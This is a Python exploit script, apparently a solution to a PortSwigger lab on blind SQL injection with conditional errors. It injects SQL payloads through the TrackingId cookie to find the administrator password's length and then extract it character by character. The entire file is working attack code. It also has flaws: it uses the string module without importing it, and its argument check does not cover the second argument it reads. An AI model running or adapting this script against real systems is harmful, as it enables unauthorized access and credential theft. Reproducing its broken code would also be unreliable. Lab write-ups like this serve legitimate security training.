# Created by sm6r, 2024
# Lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
import sys
import requests

MIN_PASS_LENGTH = 10
MAX_PASS_LENGTH = 50
PASS_CHARS = string.ascii_lowercase + string.digits
RESULT = []

if len(sys.argv) < 2:
    print("usage: solution.py $URL$ verbose={1,0}")
    exit()

if sys.argv[2] =="1":
    def printV(inject):
        print(inject)
else:
    def printV(inject):
        pass


URL = sys.argv[1]

def getPasswdLength(cookie):
    printV("-- PASSWD LENGTH: ")
    for i in range(MIN_PASS_LENGTH,MAX_PASS_LENGTH,1):
        inject = cookie+f"\' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password) > {i}) || ' "
        printV(inject)
        resp = requests.get(URL,cookies={"TrackingId":inject})

        if resp.text.find("Error") == -1:
            print(f"Password Length is : {i}")
            return i
    return 0



def getChar(cookie,offset):
    for i in PASS_CHARS:
        inject = cookie+f"' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and SUBSTR(password,{offset},1)='{i}') || '"
        printV(inject)
        resp = requests.get(URL,cookies={"TrackingId":inject})
        
        if resp.text.find("Gateway Timeout") != -1:
            print("Invalid URL")
            exit()

        if resp.text.find("Error") != -1:
            print(f"PASSWORD [{offset}] = {i}\n")
            return i

    return 0
        

def main():
    resp = requests.get(URL)
    trackingCookie = resp.cookies['TrackingId']
    passLen = getPasswdLength(trackingCookie)

    for i in range(1,passLen+1):
        RESULT.append(getChar(trackingCookie,i))

    print("\nATTACK DONE SECCESSFULLY, THE ADMIN PASSWD IS "+''.join(RESULT))


if __name__ == "__main__":
    main()
